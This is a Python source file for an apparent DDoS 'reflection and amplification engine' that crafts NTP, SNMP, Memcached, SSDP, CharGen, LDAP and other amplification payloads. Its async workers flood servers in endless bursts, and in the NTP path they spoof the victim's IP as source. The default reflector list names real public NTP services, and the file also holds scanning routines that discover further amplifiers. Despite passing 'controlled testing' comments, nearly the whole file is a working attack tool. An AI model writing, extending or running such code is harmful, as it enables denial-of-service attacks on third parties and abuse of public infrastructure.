#!/usr/bin/env python3
"""
Reflection and Amplification Engine
Implements NTP, SNMP, Memcached, SSDP, CharGen, and LDAP reflection attacks
"""

import asyncio
import socket
import struct
import random
import time
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass
from scapy.layers.inet import IP, UDP
from scapy.packet import Raw

@dataclass
class ReflectionAttackConfig:
    """Configuration for reflection attacks"""
    target: str
    amplification_servers: Dict[str, List[str]] = None
    enable_spoofing: bool = True
    spoofing_rate: float = 0.8
    max_amplification_factor: int = 100
    discovery_enabled: bool = True
    rotation_interval: float = 60.0

class AmplificationServerDatabase:
    """Database of amplification servers for different protocols"""
    
    # NTP servers (port 123)
    NTP_SERVERS = [
        "pool.ntp.org", "time.nist.gov", "time.google.com",
        "time.cloudflare.com", "time.windows.com", "time.apple.com",
        "ntp.ubuntu.com", "0.pool.ntp.org", "1.pool.ntp.org"
    ]
    
    # SNMP servers (port 161) - for controlled testing environments
    SNMP_SERVERS = [
        "192.168.1.1", "10.0.0.1", "172.16.0.1",
        "192.168.0.1", "10.1.1.1", "172.20.0.1"
    ]
    
    # Memcached servers (port 11211) - for controlled testing
    MEMCACHED_SERVERS = [
        "127.0.0.1:11211", "localhost:11211"
    ]
    
    # SSDP multicast (port 1900)
    SSDP_TARGETS = [
        "239.255.255.250"  # SSDP multicast address
    ]
    
    # CharGen servers (port 19) - legacy protocol
    CHARGEN_SERVERS = [
        "192.168.1.1", "10.0.0.1", "172.16.0.1"
    ]
    
    # LDAP servers (port 389) - for controlled testing
    LDAP_SERVERS = [
        "192.168.1.100", "10.0.0.100", "172.16.0.100"
    ]
    
    # Additional protocols for amplification
    TFTP_SERVERS = ["192.168.1.1", "10.0.0.1"]  # Port 69
    RPC_SERVERS = ["192.168.1.1", "10.0.0.1"]   # Port 111
    NETBIOS_SERVERS = ["192.168.1.1", "10.0.0.1"]  # Port 137

class ReflectionPayloadGenerator:
    """Generates payloads for different reflection protocols"""
    
    @staticmethod
    def ntp_monlist_payload() -> bytes:
        """Generate NTP monlist request for maximum amplification"""
        # NTP monlist request (deprecated but still works on some servers)
        return struct.pack("!BBBBIIIIIII", 
                          0x17,  # LI=0, VN=2, Mode=7 (private)
                          0x00,  # Stratum
                          0x03,  # Poll
                          0x2a,  # Precision
                          0, 0, 0, 0, 0, 0, 0)  # Rest of header
    
    @staticmethod
    def ntp_getconfig_payload() -> bytes:
        """Generate NTP getconfig request"""
        return struct.pack("!BBBBIIIIIII",
                          0x16,  # LI=0, VN=2, Mode=6 (control)
                          0x02,  # Response bit + Error bit
                          0x00, 0x00,  # Sequence, Status
                          0, 0, 0, 0, 0, 0, 0)
    
    @staticmethod
    def snmp_getbulk_payload() -> bytes:
        """Generate SNMP GetBulkRequest for amplification"""
        # SNMP GetBulkRequest with high max-repetitions
        return bytes([
            0x30, 0x3e,  # SEQUENCE (62 bytes)
            0x02, 0x01, 0x01,  # Version (SNMPv2c)
            0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,  # Community "public"
            0xa5, 0x31,  # GetBulkRequest (49 bytes)
            0x02, 0x04, 0x00, 0x00, 0x00, 0x01,  # Request ID
            0x02, 0x01, 0x00,  # Non-repeaters (0)
            0x02, 0x02, 0x03, 0xff,  # Max-repetitions (1023)
            0x30, 0x21,  # Variable bindings
            0x30, 0x1f,  # Variable binding
            0x06, 0x1b,  # OID (27 bytes)
            0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00,  # 1.3.6.1.2.1.1.1.0 (sysDescr)
            0x05, 0x00  # NULL
        ])
    
    @staticmethod
    def memcached_stats_payload() -> bytes:
        """Generate Memcached stats request"""
        return b"stats\r\n"
    
    @staticmethod
    def memcached_version_payload() -> bytes:
        """Generate Memcached version request"""
        return b"version\r\n"
    
    @staticmethod
    def ssdp_msearch_payload() -> bytes:
        """Generate SSDP M-SEARCH request"""
        ssdp_request = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            "ST: upnp:rootdevice\r\n"
            "MX: 3\r\n\r\n"
        )
        return ssdp_request.encode()
    
    @staticmethod
    def chargen_payload() -> bytes:
        """Generate CharGen request"""
        return b"\x01"  # Simple request to trigger character generation
    
    @staticmethod
    def ldap_search_payload() -> bytes:
        """Generate LDAP search request"""
        # LDAP SearchRequest for base DN
        return bytes([
            0x30, 0x25,  # SEQUENCE (37 bytes)
            0x02, 0x01, 0x01,  # Message ID
            0x63, 0x20,  # SearchRequest (32 bytes)
            0x04, 0x00,  # Base DN (empty)
            0x0a, 0x01, 0x02,  # Scope (wholeSubtree)
            0x0a, 0x01, 0x00,  # DerefAliases (neverDerefAliases)
            0x02, 0x01, 0x00,  # Size limit (0 = no limit)
            0x02, 0x01, 0x00,  # Time limit (0 = no limit)
            0x01, 0x01, 0x00,  # Types only (FALSE)
            0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73,  # Filter (objectClass=*)
            0x30, 0x00  # Attributes (empty)
        ])
    
    @staticmethod
    def tftp_read_payload(filename: str = "netascii") -> bytes:
        """Generate TFTP read request"""
        # TFTP RRQ (Read Request)
        payload = struct.pack("!H", 1)  # Opcode: RRQ
        payload += filename.encode() + b"\x00"
        payload += b"netascii\x00"
        return payload
    
    @staticmethod
    def rpc_dump_payload() -> bytes:
        """Generate RPC dump request"""
        # RPC DUMP request
        return struct.pack("!IIIIIIII",
                          random.randint(0, 2**32-1),  # XID
                          0,  # Message type (call)
                          2,  # RPC version
                          100000,  # Program (portmapper)
                          2,  # Version
                          4,  # Procedure (DUMP)
                          0, 0)  # Auth (none)
    
    @staticmethod
    def netbios_name_query_payload(name: str = "WORKGROUP") -> bytes:
        """Generate NetBIOS name query"""
        # NetBIOS Name Service query
        transaction_id = random.randint(0, 65535)
        
        # Header
        header = struct.pack("!HHHHHH", 
                           transaction_id, 0x0100,  # Query flags
                           1, 0, 0, 0)  # Questions, Answers, Authority, Additional
        
        # Encode NetBIOS name
        encoded_name = b""
        padded_name = (name + " " * 15)[:15] + "\x00"
        
        for char in padded_name:
            encoded_name += bytes([ord('A') + (ord(char) >> 4)])
            encoded_name += bytes([ord('A') + (ord(char) & 0x0F)])
        
        # Question
        question = encoded_name + b"\x00"  # End of name
        question += struct.pack("!HH", 0x0020, 0x0001)  # Type NB, Class IN
        
        return header + question

class ReflectionAmplificationEngine:
    """Advanced reflection and amplification attack engine"""
    
    def __init__(self, config: ReflectionAttackConfig):
        self.config = config
        self.payload_gen = ReflectionPayloadGenerator()
        self.server_db = AmplificationServerDatabase()
        self.discovered_servers = {
            'ntp': [],
            'snmp': [],
            'memcached': [],
            'ssdp': [],
            'chargen': [],
            'ldap': [],
            'tftp': [],
            'rpc': [],
            'netbios': []
        }
        self.spoofed_ips = self._generate_spoofed_ips()
        self.stats = {
            'reflection_requests': 0,
            'amplification_factor': 0,
            'bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'servers_discovered': 0,
            'protocols_used': set(),
            'errors': 0
        }
    
    def _generate_spoofed_ips(self) -> List[str]:
        """Generate pool of spoofed IP addresses"""
        ips = []
        for _ in range(2000):  # Large pool for reflection attacks
            # Generate random IP addresses
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            ips.append(ip)
        return ips
    
    async def ntp_reflection_attack(self, duration: float = 0) -> None:
        """
        NTP reflection attack using monlist and other requests
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Get NTP servers
        ntp_servers = (self.config.amplification_servers or {}).get('ntp', self.server_db.NTP_SERVERS)
        
        for server in ntp_servers:
            task = asyncio.create_task(self._ntp_reflection_worker(server))
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _ntp_reflection_worker(self, ntp_server: str) -> None:
        """NTP reflection worker"""
        try:
            # Resolve hostname to IP if needed
            try:
                server_ip = socket.gethostbyname(ntp_server)
            except socket.gaierror:
                return
            
            # Create raw socket for spoofing
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                use_raw = True
            except PermissionError:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                use_raw = False
            
            while True:
                for _ in range(50):  # Burst of requests
                    try:
                        # Alternate between different NTP request types
                        payloads = [
                            self.payload_gen.ntp_monlist_payload(),
                            self.payload_gen.ntp_getconfig_payload()
                        ]
                        payload = random.choice(payloads)
                        
                        if use_raw and self.config.enable_spoofing and random.random() < self.config.spoofing_rate:
                            # Create spoofed packet
                            source_ip = self.config.target  # Spoof as target
                            
                            ip_packet = IP(src=source_ip, dst=server_ip) / UDP(
                                sport=random.randint(1024, 65535),
                                dport=123
                            ) / Raw(load=payload)
                            
                            sock.sendto(bytes(ip_packet), (server_ip, 0))
                        else:
                            # Regular request
                            sock.sendto(payload, (server_ip, 123))
                        
                        self.stats['reflection_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        self.stats['estimated_amplified_bytes'] += len(payload) * 50  # NTP amplification factor
                        self.stats['protocols_used'].add('ntp')
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.02)
                
        finally:
            try:
                sock.close()
            except:
                pass
    
    async def snmp_reflection_attack(self, duration: float = 0) -> None:
        """
        SNMP reflection attack using GetBulkRequest
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Get SNMP servers
        snmp_servers = (self.config.amplification_servers or {}).get('snmp', self.server_db.SNMP_SERVERS)
        
        for server in snmp_servers:
            task = asyncio.create_task(self._snmp_reflection_worker(server))
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _snmp_reflection_worker(self, snmp_server: str) -> None:
        """SNMP reflection worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(30):  # Burst of SNMP requests
                    try:
                        payload = self.payload_gen.snmp_getbulk_payload()
                        
                        sock.sendto(payload, (snmp_server, 161))
                        
                        self.stats['reflection_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        self.stats['estimated_amplified_bytes'] += len(payload) * 20  # SNMP amplification factor
                        self.stats['protocols_used'].add('snmp')
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.05)
                
        finally:
            sock.close()
    
    async def memcached_reflection_attack(self, duration: float = 0) -> None:
        """
        Memcached reflection attack
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Get Memcached servers
        memcached_servers = (self.config.amplification_servers or {}).get('memcached', self.server_db.MEMCACHED_SERVERS)
        
        for server_addr in memcached_servers:
            host, port = server_addr.split(':')
            task = asyncio.create_task(self._memcached_reflection_worker(host, int(port)))
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _memcached_reflection_worker(self, host: str, port: int) -> None:
        """Memcached reflection worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(20):  # Burst of Memcached requests
                    try:
                        # Alternate between different Memcached commands
                        payloads = [
                            self.payload_gen.memcached_stats_payload(),
                            self.payload_gen.memcached_version_payload()
                        ]
                        payload = random.choice(payloads)
                        
                        sock.sendto(payload, (host, port))
                        
                        self.stats['reflection_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        self.stats['estimated_amplified_bytes'] += len(payload) * 100  # High amplification
                        self.stats['protocols_used'].add('memcached')
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.1)
                
        finally:
            sock.close()
    
    async def ssdp_reflection_attack(self, duration: float = 0) -> None:
        """
        SSDP reflection attack
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while duration == 0 or (time.time() - start_time) < duration:
                for _ in range(100):  # Burst of SSDP requests
                    try:
                        payload = self.payload_gen.ssdp_msearch_payload()
                        
                        # Send to SSDP multicast address
                        sock.sendto(payload, ("239.255.255.250", 1900))
                        
                        self.stats['reflection_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        self.stats['estimated_amplified_bytes'] += len(payload) * 5  # SSDP amplification
                        self.stats['protocols_used'].add('ssdp')
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.01)
                
        finally:
            sock.close()
    
    async def chargen_reflection_attack(self, duration: float = 0) -> None:
        """
        CharGen reflection attack
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Get CharGen servers
        chargen_servers = (self.config.amplification_servers or {}).get('chargen', self.server_db.CHARGEN_SERVERS)
        
        for server in chargen_servers:
            task = asyncio.create_task(self._chargen_reflection_worker(server))
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _chargen_reflection_worker(self, chargen_server: str) -> None:
        """CharGen reflection worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(50):  # Burst of CharGen requests
                    try:
                        payload = self.payload_gen.chargen_payload()
                        
                        sock.sendto(payload, (chargen_server, 19))
                        
                        self.stats['reflection_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        self.stats['estimated_amplified_bytes'] += len(payload) * 358  # CharGen high amplification
                        self.stats['protocols_used'].add('chargen')
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.05)
                
        finally:
            sock.close()
    
    async def ldap_reflection_attack(self, duration: float = 0) -> None:
        """
        LDAP reflection attack
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Get LDAP servers
        ldap_servers = (self.config.amplification_servers or {}).get('ldap', self.server_db.LDAP_SERVERS)
        
        for server in ldap_servers:
            task = asyncio.create_task(self._ldap_reflection_worker(server))
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _ldap_reflection_worker(self, ldap_server: str) -> None:
        """LDAP reflection worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(20):  # Burst of LDAP requests
                    try:
                        payload = self.payload_gen.ldap_search_payload()
                        
                        sock.sendto(payload, (ldap_server, 389))
                        
                        self.stats['reflection_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        self.stats['estimated_amplified_bytes'] += len(payload) * 30  # LDAP amplification
                        self.stats['protocols_used'].add('ldap')
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.1)
                
        finally:
            sock.close()
    
    async def intelligent_server_discovery(self) -> None:
        """
        Discover amplification servers automatically
        Requirements: 5.1, 5.4, 5.5
        """
        if not self.config.discovery_enabled:
            return
        
        discovery_tasks = [
            self._discover_ntp_servers(),
            self._discover_snmp_servers(),
            self._discover_memcached_servers()
        ]
        
        await asyncio.gather(*discovery_tasks, return_exceptions=True)
    
    async def _discover_ntp_servers(self) -> None:
        """Discover NTP servers"""
        # Scan common NTP server ranges
        for i in range(0, 4):  # pool.ntp.org has 0-3
            server = f"{i}.pool.ntp.org"
            try:
                # Test if server responds
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.0)
                
                payload = self.payload_gen.ntp_monlist_payload()
                server_ip = socket.gethostbyname(server)
                
                sock.sendto(payload, (server_ip, 123))
                response = sock.recv(1024)
                
                if len(response) > len(payload):  # Amplification detected
                    self.discovered_servers['ntp'].append(server)
                    self.stats['servers_discovered'] += 1
                
                sock.close()
                
            except:
                pass
    
    async def _discover_snmp_servers(self) -> None:
        """Discover SNMP servers in local network ranges"""
        # Scan common private IP ranges
        ranges = [
            "192.168.1.{}", "192.168.0.{}", "10.0.0.{}",
            "172.16.0.{}", "172.20.0.{}"
        ]
        
        for ip_range in ranges:
            for i in range(1, 255, 10):  # Sample every 10th IP
                ip = ip_range.format(i)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1.0)
                    
                    payload = self.payload_gen.snmp_getbulk_payload()
                    sock.sendto(payload, (ip, 161))
                    response = sock.recv(1024)
                    
                    if len(response) > len(payload):
                        self.discovered_servers['snmp'].append(ip)
                        self.stats['servers_discovered'] += 1
                    
                    sock.close()
                    
                except:
                    pass
    
    async def _discover_memcached_servers(self) -> None:
        """Discover Memcached servers"""
        # Check localhost and common IPs
        test_ips = ["127.0.0.1", "localhost"]
        
        for ip in test_ips:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1.0)
                
                payload = self.payload_gen.memcached_stats_payload()
                sock.sendto(payload, (ip, 11211))
                response = sock.recv(1024)
                
                if b"STAT" in response:  # Memcached response
                    self.discovered_servers['memcached'].append(f"{ip}:11211")
                    self.stats['servers_discovered'] += 1
                
                sock.close()
                
            except:
                pass
    
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        stats = self.stats.copy()
        stats['protocols_used'] = list(stats['protocols_used'])
        
        # Calculate overall amplification factor
        if stats['bytes_sent'] > 0:
            stats['amplification_factor'] = stats['estimated_amplified_bytes'] / stats['bytes_sent']
        
        return stats
    
    async def coordinated_reflection_attack(self, protocols: List[str], duration: float = 0) -> None:
        """
        Coordinate multiple reflection attack types simultaneously
        Requirements: 5.1, 5.4, 5.5
        """
        # Discover servers first if enabled
        if self.config.discovery_enabled:
            await self.intelligent_server_discovery()
        
        tasks = []
        
        if "ntp" in protocols:
            tasks.append(asyncio.create_task(self.ntp_reflection_attack(duration)))
        
        if "snmp" in protocols:
            tasks.append(asyncio.create_task(self.snmp_reflection_attack(duration)))
        
        if "memcached" in protocols:
            tasks.append(asyncio.create_task(self.memcached_reflection_attack(duration)))
        
        if "ssdp" in protocols:
            tasks.append(asyncio.create_task(self.ssdp_reflection_attack(duration)))
        
        if "chargen" in protocols:
            tasks.append(asyncio.create_task(self.chargen_reflection_attack(duration)))
        
        if "ldap" in protocols:
            tasks.append(asyncio.create_task(self.ldap_reflection_attack(duration)))
        
        try:
            await asyncio.gather(*tasks)
        finally:
            for task in tasks:
                if not task.done():
                    task.cancel()